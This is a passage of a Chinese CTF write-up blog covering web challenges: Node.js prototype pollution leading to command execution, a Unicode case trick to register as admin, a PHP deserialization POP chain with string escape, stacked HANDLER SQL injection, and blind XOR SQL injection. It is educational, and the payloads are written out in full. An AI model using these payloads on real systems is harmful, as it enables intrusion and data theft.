 <br>&#125;);<br>router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router;<br></code></pre></td></tr></table></figure><p>看到了js原型链污染漏洞的标志性函数：<code>merge</code> 应该就是原型链污染了。</p><p>但是看到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215614.png" alt="image-20210417215614572"></p><p>ADMIN用户才可以触发<code>clone</code> 进而利用<code>merge</code>。但是限制了admin注册，看下注册登陆处：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215956.png" alt="image-20210417215955907"></p><p>注册处会有验证，但是后边写入session的时候会经过<code>toUpperCase()</code>函数的处理，不由得想到了nodejs的大小写转换特性：</p><blockquote><p>对于toUpperCase():</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">字符<span class="hljs-string">&quot;ı&quot;</span>、<span class="hljs-string">&quot;ſ&quot;</span> 经过<span class="hljs-keyword">to</span>UpperCase处理后结果为 <span class="hljs-string">&quot;I&quot;</span>、<span class="hljs-string">&quot;S&quot;</span><br></code></pre></td></tr></table></figure><p>对于toLowerCase():</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">字符<span class="hljs-string">&quot;K&quot;</span>经过toLowerCase处理后结果为<span class="hljs-string">&quot;k&quot;</span><span class="hljs-comment">(这个K不是K)</span><br></code></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p></blockquote><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可见我们要想得到<code>ADMIN</code> 可以注册<code>admın</code> 经过处理就得到<code>ADMIN</code>：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417220456.png" alt="image-20210417220456007"></p><p>成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在<code>outputFunctionName</code>，并且<code>res.outputFunctionName=undefined;</code>在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417225149.png" alt="image-20210417225148836"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">Content</span>-Type: application/json<br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>路径通过报错得到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224238.png" alt="image-20210417224237777"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224605.png" alt="image-20210417224604692"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224723.png" alt="image-20210417224723183"></p><p>然后访问/flag 得到flag。</p><h3 id="WEB-Easyphp"><a href="#WEB-Easyphp" class="headerlink" title="[WEB]Easyphp"></a>[WEB]Easyphp</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>扫描目录发现：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404184917405.png" alt="image-20210404184917405"></p><p>存在备份文件，下载代码审计：</p><p>admin 进入update页面 可得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185032670.png" alt="image-20210404185032670"></p><p>查看是否存在注入：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404185139780.png" alt="image-20210404185139780"></p><p>存在预处理，因此无法注入</p><p>查询的sql语句为：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> id,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username=?<br></code></pre></td></tr></table></figure><p>查询admin用户的密码，密码和数据库相等则登陆成功。</p><p>通过控制执行的语句即可绕过登录admin：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> id,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username=?  <br>//<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>为<span class="hljs-number">123</span>的MD5，密码输入<span class="hljs-number">123</span>即可<br></code></pre></td></tr></table></figure><p>接下来就是利用反序列化漏洞，构造pop链去执行sql语句：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190050208.png" alt="image-20210404190050208"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">UpdateHelper类在结束时 会<span class="hljs-built_in">echo</span> 调用魔术方法<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190403536.png" alt="image-20210404190403536"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">触发<span class="hljs-keyword">User</span>的__toString()方法<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404190518655.png" alt="image-20210404190518655"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">调用<span class="hljs-built_in">Info</span>的__<span class="hljs-built_in">call</span>()方法<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404191205555.png" alt="image-20210404191205555"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">__<span class="hljs-keyword">call</span> 方法调用了login<br></code></pre></td></tr></table></figure><p>这里可以：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$this</span>-&gt;CtrlCase 为dbCtrl类<br>login参数为：<span class="hljs-variable">$this</span>-&gt;age传进来的<br></code></pre></td></tr></table></figure><p>pop 链：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194116259.png" alt="image-20210404194116259"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">70</span>:<span class="hljs-string">&quot;select 1,&quot;</span><span class="hljs-number">202</span>cb<span class="hljs-number">962</span>ac<span class="hljs-number">59075</span>b<span class="hljs-number">964</span>b<span class="hljs-number">07152</span>d<span class="hljs-number">234</span>b<span class="hljs-number">70</span><span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>寻找反序列化入口：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404195102818.png" alt="image-20210404195102818"></p><p>update页面会调用update方法：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404194612300.png" alt="image-20210404194612300"></p><p>可见<code>$_POST[&#39;age&#39;]</code>与<code>$_POST[&#39;nickname&#39;]</code>可控，传入Info类实例化，然后反序列化，再经过safe函数处理。</p><p>可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211512856.png" alt="image-20210404211512856"></p><p>可见是一个字符增加的字符串逃逸。</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Info()类正常序列化：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;testage&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;testname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:70:&quot;</span>select <span class="hljs-number">1</span>,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:2:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">265</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">70</span>:<span class="hljs-string">&quot;select 1,&quot;</span><span class="hljs-number">202</span>cb<span class="hljs-number">962</span>ac<span class="hljs-number">59075</span>b<span class="hljs-number">964</span>b<span class="hljs-number">07152</span>d<span class="hljs-number">234</span>b<span class="hljs-number">70</span><span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;&#125;&#125;&#125;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="hljs-string">&quot;;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:70:&quot;</span>select <span class="hljs-number">1</span>,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:2:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>序列化一下并用safe函数处理：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">1590</span>:<span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">70</span>:<span class="hljs-string">&quot;select 1,&quot;</span><span class="hljs-number">202</span>cb<span class="hljs-number">962</span>ac<span class="hljs-number">59075</span>b<span class="hljs-number">964</span>b<span class="hljs-number">07152</span>d<span class="hljs-number">234</span>b<span class="hljs-number">70</span><span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;&#125;&#125;&#125;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211056046.png" alt="image-20210404211056046"></p><p>可见可以逃逸出来，因此payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">age=<span class="hljs-number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="hljs-string">&quot;;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:70:&quot;</span>select <span class="hljs-number">1</span>,<span class="hljs-string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:1:&#123;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:2:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211250655.png" alt="image-20210404211250655"></p><p>登录页面 用户名admin 密码任意：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211322225.png" alt="image-20210404211322225"></p><h3 id="WEB-Blacklist"><a href="#WEB-Blacklist" class="headerlink" title="[WEB]Blacklist"></a>[WEB]Blacklist</h3><h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先查询，发现和强网杯的很像</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124133764.png" alt="image-20210404124133764"></p><p>因此尝试堆叠注入，过滤字符：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124229017.png" alt="image-20210404124229017"></p><p>因此无法改名，也无法用预处理语句。</p><p>通过查资料 发现可以利用<code>handler</code>语句</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130143408.png" alt="image-20210404130143408"></p><p>可见flag在<code>FlagHere</code>表</p><h4 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h4><p>构造语句查一下第一行数据：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">通过<span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">OPEN</span>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br> 通过<span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">READ</span> FIRST获取句柄的第一行，通过<span class="hljs-keyword">READ</span> NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br> 通过<span class="hljs-keyword">HANDLER</span> tbl_name <span class="hljs-keyword">CLOSE</span>来关闭打开的句柄。<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>&#x27;;handler `FlagHere` <span class="hljs-keyword">open</span>;handler `FlagHere` read first;handler `FlagHere` close;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130502802.png" alt="image-20210404130502802"></p><p>直接查到了flag。</p><h3 id="WEB-Ezsqli"><a href="#WEB-Ezsqli" class="headerlink" title="[WEB]Ezsqli"></a>[WEB]Ezsqli</h3><h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数：</p><p>发现and、or等函数都过滤了：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135430569.png" alt="image-20210404135430569"></p><p>发现<code>^</code>没有过滤，采用<code>^</code>测试注入点：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>^<span class="hljs-number">0</span>%<span class="hljs-number">23</span><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>^<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135535230.png" alt="image-20210404135535230"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135616538.png" alt="image-20210404135616538"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135712369.png" alt="image-20210404135712369"></p><p>返回错误</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135756770.png" alt="image-20210404135756770"></p><p>返回正确。</p><p>发现存在注入。</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140526716.png" alt="image-20210404140526716"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140614551.png" alt="image-20210404140614551"></p><p>接下来就构造注入语句，因为过滤了or，所以无法使用<code>information_schema</code></p><p>绕过函数：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_auto</span>_increment_columns<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_flattened</span>_keys<br>join无列名注入<br></code></pre></td></tr></table></figure><p>构造查表语句：</p><p>判断逻辑：返回Nu1L说明payload为1对，语句成立</p><p>返回Error Occured When Fetch Result payload为0，语句不成立</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查表名：<br>id=<span class="hljs-number">1</span>^(ascii(substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),&#123;&#125;,<span class="hljs-number">1</span>))=&#123;&#125;)^<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404152201048.png" alt="image-20210404152201048"></p><p>可见表名：f1ag_1s_h3r3_hhhhh</p><p>下面用无列名注入，利用到了ascii位偏移：</p><p>两个字符串比较时利用首字符的ascii码</p><p>核心payload：<code>(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></p><p>//子查询之间也可以直接通过<code>&gt;、&lt;、=</code>来进行判断。</p><p>测试字段：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br><span class="hljs-attribute">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160620528.png" alt="image-20210404160620528"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160633320.png" alt="image-20210404160633320"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160645953.png" 